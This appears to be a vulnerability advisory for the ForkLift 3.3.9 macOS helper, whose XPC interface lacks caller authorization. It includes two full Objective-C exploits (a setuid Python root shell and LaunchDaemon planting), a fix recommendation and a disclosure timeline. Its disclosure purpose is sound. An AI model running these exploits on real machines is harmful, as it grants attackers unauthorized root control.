# Forklift 3.3.9 Local Privilege Escalation

When installing the Forklift, a new helper called ``com.binarynights.ForkLiftHelper`` for Mac OS X is automatically installed to the ``/Library/PrivilegedHelperTools/`` directory.
Analyzing this helper, which handles XPC messages, resulted in different ways of escalating privileges from user to ``root`` on Mac OS X.

When accepting XPC calls the ``HelperTool listener:shouldAcceptNewConnection`` respectively ``(BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)connection`` function by default. This function is used to perform the initial steps for establishing an XPC connection. Usually, this function performs the authorization of the caller—however, the function of the ``com.binarynights.ForkLiftHelper`` does not implement any authorization checks. Thus, it is possible to call any exposed functions over XPC unauthorized. 

The following functions are exposed over XPC to the caller:

```c
@protocol _TtP4main21ForkLiftHelperProtcol_
- (void)changePermissions:(NSString *)arg1 permissions:(long long)arg2 reply:(void (^)(NSError *))arg3;
- (void)changeOwner:(NSString *)arg1 owner:(long long)arg2 group:(long long)arg3 reply:(void (^)(NSError *))arg4;
- (void)calculateDirectorySize:(NSString *)arg1 reply:(void (^)(NSNumber *, NSError *))arg2;
- (void)createDirectory:(NSString *)arg1 reply:(void (^)(NSError *))arg2;
- (void)deleteItem:(NSString *)arg1 reply:(void (^)(NSError *))arg2;
- (void)moveItem:(NSString *)arg1 targetPath:(NSString *)arg2 reply:(void (^)(NSError *))arg3;
- (void)copyItemAbort:(NSString *)arg1;
- (void)copyItemProgress:(NSString *)arg1 reply:(void (^)(NSNumber *, NSError *))arg2;
- (void)copyItem:(NSString *)arg1 targetPath:(NSString *)arg2 UUID:(NSString *)arg3 reply:(void (^)(NSError *))arg4;
- (void)moveToTrash:(NSString *)arg1 reply:(void (^)(NSError *))arg2;
- (void)getHelperVersion:(void (^)(NSString *))arg1;
@end
```

## Setuid Exploitation

The first method to exploit this helper is as follows:

### Step 1: Interpreter Target chown
Copy, for example, the python interpreter to a user-controllable directory and call the XPC function ``changeOwner`` with the parameter ``@"<path>" owner:0 group:0``. This will change the ownership of the python interpreter to ``root``.

### Step 2: Set SUID flag
Second, it is possible to set the SUID bit to the interpreter issuing an XPC request to the ``changePermissions`` function with the following parameter ``@"<path>" permissions:2541``. The permissions ``2541`` represent in octal the number ``4755``, which sets the SUID flag on the binary. 

### Step 3: LPE

The following command will spawn a shell as root:
```
$/tmp/python_copied -c 'import pty; import os; os.setuid(0);pty.spawn("/bin/bash")'
# id
uid=0(root) [...]
```


### Full Exploit

Please make sure to first have a python interpreter copied to ``/tmp`` with the name ``python_copied``.
The following exploit displays this LPE:

```c
//
//  main.m
//  build
//  gcc -framework Foundation exploit.m -o exploit
//  
//

#import <Foundation/Foundation.h>

static NSString* kXPCHelperMachServiceName = @"com.binarynights.ForkLiftHelper";

// The protocol that Forklift will vend as its XPC API.
@protocol _TtP4main21ForkLiftHelperProtcol_
- (void)changePermissions:(NSString *)arg1 permissions:(long long)arg2 reply:(void (^)(NSError *))arg3;
- (void)changeOwner:(NSString *)arg1 owner:(long long)arg2 group:(long long)arg3 reply:(void (^)(NSError *))arg4;
- (void)calculateDirectorySize:(NSString *)arg1 reply:(void (^)(NSNumber *, NSError *))arg2;
- (void)createDirectory:(NSString *)arg1 reply:(void (^)(NSError *))arg2;
- (void)deleteItem:(NSString *)arg1 reply:(void (^)(NSError *))arg2;
- (void)moveItem:(NSString *)arg1 targetPath:(NSString *)arg2 reply:(void (^)(NSError *))arg3;
- (void)copyItemAbort:(NSString *)arg1;
- (void)copyItemProgress:(NSString *)arg1 reply:(void (^)(NSNumber *, NSError *))arg2;
- (void)copyItem:(NSString *)arg1 targetPath:(NSString *)arg2 UUID:(NSString *)arg3 reply:(void (^)(NSError *))arg4;
- (void)moveToTrash:(NSString *)arg1 reply:(void (^)(NSError *))arg2;
- (void)getHelperVersion:(void (^)(NSString *))arg1;
@end

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        
        NSString*  _serviceName = kXPCHelperMachServiceName;

        NSXPCConnection* _agentConnection = [[NSXPCConnection alloc] initWithMachServiceName:_serviceName options:4096];
        [_agentConnection setRemoteObjectInterface:[NSXPCInterface interfaceWithProtocol:@protocol(_TtP4main21ForkLiftHelperProtcol_)]];
        [_agentConnection resume];

        //        run user script as root/
        [[_agentConnection remoteObjectProxyWithErrorHandler:^(NSError* error) {
            (void)error;
            NSLog(@"Connection Failure");
        }] changeOwner:@"/tmp/python_copied" owner:0 group:0 reply:^(NSError * err){
            NSLog(@"Reply, %@", err);
        }];
        [[_agentConnection remoteObjectProxyWithErrorHandler:^(NSError* error) {
            (void)error;
            NSLog(@"Connection Failure");
        }] changePermissions:@"/tmp/python_copied" permissions:2541 reply:^(NSError * err){
            NSLog(@"Reply, %@", err);
        }];
        
        NSLog(@"Done!");
    }
    return 0;
}
```

## LaunchAgent Exploitation
The second method to exploit this helper is as follows:

### Writing a new Launch Agent

Due to the XPC call ``moveItem`` it is possible to move any item as ``root``. Thus, it is possible to write a ``plist`` file to the ``/tmp`` directory and then copy it to the ``/Library/LaunchDaemons/`` directory. The following parameters are used for the ``moveItem`` function ``@"/tmp/com.sample.Load.plist" targetPath:@"/Library/LaunchDaemons/com.sample.Load.plist"``

### Full Exploit

The following code will automatically add a new launch agent which is triggered at a restart:

```c
//
//  main.m
//  build
//  gcc -framework Foundation exploit.m -o exploit
//

#import <Foundation/Foundation.h>

static NSString* kXPCHelperMachServiceName = @"com.binarynights.ForkLiftHelper";

// The protocol that Forklift will vend as its XPC API.
@protocol _TtP4main21ForkLiftHelperProtcol_
- (void)changePermissions:(NSString *)arg1 permissions:(long long)arg2 reply:(void (^)(NSError *))arg3;
- (void)changeOwner:(NSString *)arg1 owner:(long long)arg2 group:(long long)arg3 reply:(void (^)(NSError *))arg4;
- (void)calculateDirectorySize:(NSString *)arg1 reply:(void (^)(NSNumber *, NSError *))arg2;
- (void)createDirectory:(NSString *)arg1 reply:(void (^)(NSError *))arg2;
- (void)deleteItem:(NSString *)arg1 reply:(void (^)(NSError *))arg2;
- (void)moveItem:(NSString *)arg1 targetPath:(NSString *)arg2 reply:(void (^)(NSError *))arg3;
- (void)copyItemAbort:(NSString *)arg1;
- (void)copyItemProgress:(NSString *)arg1 reply:(void (^)(NSNumber *, NSError *))arg2;
- (void)copyItem:(NSString *)arg1 targetPath:(NSString *)arg2 UUID:(NSString *)arg3 reply:(void (^)(NSError *))arg4;
- (void)moveToTrash:(NSString *)arg1 reply:(void (^)(NSError *))arg2;
- (void)getHelperVersion:(void (^)(NSString *))arg1;
@end

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        NSString* my_plist = @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
        "<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
        "<plist version=\"1.0\">"
        "<dict>"
        "  <key>Label</key>"
        "  <string>com.sample.Load</string>"
        "  <key>ProgramArguments</key>"
        "  <array>"
        "      <string>/bin/zsh</string>"
      "      <string>-c</string>"
      "      <string>touch /Library/foobar.txt</string>"
        "  </array>"
        "    <key>RunAtLoad</key>"
        "    <true/>"
        "</dict>"
        "</plist>";
        
        [my_plist writeToFile:@"/tmp/com.sample.Load.plist" atomically:YES encoding:NSASCIIStringEncoding error:nil];
        
        NSString*  _serviceName = kXPCHelperMachServiceName;

        NSXPCConnection* _agentConnection = [[NSXPCConnection alloc] initWithMachServiceName:_serviceName options:4096];
        [_agentConnection setRemoteObjectInterface:[NSXPCInterface interfaceWithProtocol:@protocol(_TtP4main21ForkLiftHelperProtcol_)]];
        [_agentConnection resume];

        //        run user script as root/
        [[_agentConnection remoteObjectProxyWithErrorHandler:^(NSError* error) {
            (void)error;
            NSLog(@"Connection Failure");
        }] moveItem:@"/tmp/com.sample.Load.plist" targetPath:@"/Library/LaunchDaemons/com.sample.Load.plist" reply:^(NSError * err){
            NSLog(@"Reply, %@", err);
        }];
        NSLog(@"Done!");
    }
    return 0;
}
```

## Recommendation

It is recommended to enforce authorization when calling the XPC helper. 

These authorization checks should contain:
- The caller is a valid signed application
- The caller application was well hardened against DYLIB injection attacks (runtime flag)
- The caller application has the correct TeamID from the Software Company

An excellent resource for the authorization checks can be found from the [1] source.

The following example ``shouldAcceptNewConnecton`` functions displays the different stages of the correct authorization checks:

```c
@interface NSXPCConnection(PrivateAuditToken)

// This property exists, but it's private. Make it available:
@property (nonatomic, readonly) audit_token_t auditToken;

@end

// In the NSXPCListenerDelegate:
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)connection {
   audit_token_t auditToken = connection.auditToken;
   NSData *tokenData = [NSData dataWithBytes:&auditToken length:sizeof(audit_token_t)];
   NSDictionary *attributes = @{(__bridge NSString *)kSecGuestAttributeAudit : tokenData};
   SecCodeRef code = NULL;
   if (SecCodeCopyGuestWithAttributes(NULL, (__bridge CFDictionaryRef)attributes, kSecCSDefaultFlags, &code) != errSecSuccess) {
       return NO;
   }
   // Before checking the requirement make sure that code signing flags
   // CS_HARD and CS_KILL are set. Dynamic code signature checks can only
   // check the code pages already swapped into memory, so make sure that
   // no malicious code can be loaded at a later time. You may want to
   // disable this check in debug builds.
   CFDictionaryRef csInfo = NULL;
   if (SecCodeCopySigningInformation(code, kSecCSDynamicInformation, &csInfo) != errSecSuccess) {
       return NO;
   } else {
       uint32_t csFlags = [((__bridge NSDictionary *)csInfo)[(__bridge NSString *)kSecCodeInfoStatus] intValue];
       CFRelease(csInfo);
       const uint32_t cs_hard = 0x100;         // don't load invalid pages
       const uint32_t cs_kill = 0x200;         // kill process if page is invalid
       const uint32_t cs_restrict = 0x800;     // prevent debugging
       const uint32_t cs_require_lv = 0x2000;  // Library Validation
       const uint32_t cs_runtime = 0x10000;    // hardened runtime
       if ((csFlags & (cs_hard | cs_kill)) != (cs_hard | cs_kill)) {
           // add all flags to check which are in your code signature!
           // In particular, we recommend cs_require_lv and cs_restrict.
           return NO;    // Not accepted because it can be tampered with
       }
   }

   NSString *requirementString = @"anchor apple generic and certificate leaf[subject.OU] = \"MyTeamIdentifier\"";
   SecRequirementRef requirement = NULL;

   // Check at least the peer's TeamID, e.g.
   // "anchor apple generic and certificate leaf[subject.OU] = MyTeamIdentifier"
   if (SecRequirementCreateWithString((__bridge CFStringRef)requirementString, kSecCSDefaultFlags, &requirement) != errSecSuccess) {
       abort(); // error in requirement string
   }

   OSStatus status = SecCodeCheckValidityWithErrors(code, kSecCSDefaultFlags, requirement, NULL);
   CFRelease(code);
   CFRelease(requirement);
   if (status != errSecSuccess) {
       return NO;
   }

   // further initialization of connection goes here...

   return YES;
}
```

# Disclosure Timeline

- 08.06.2020 Initial Contact for Mail Address
- 08.06.2020 Response to send the same mail unencrypted
- 09.06.2020 Follow Up question for encryption
- 10.06.2020 Clearance of Encrypted Disclosure
- 12.06.2020 Disclosure of the LPE
- 15.06.2020 Partial Fix for CVE-2020-15349 (LPE)
- 16.06.2020 Disclosure of Entitlements LPE
- 19.06.2020 Disclosure of only partial fix of CVE-2020-15349
- 19.08.2020 Fix of CVE-2020-27192 and Final Fix for CVE-2020-15349

# Resources

[1] - https://blog.obdev.at/what-we-have-learned-from-a-vulnerability/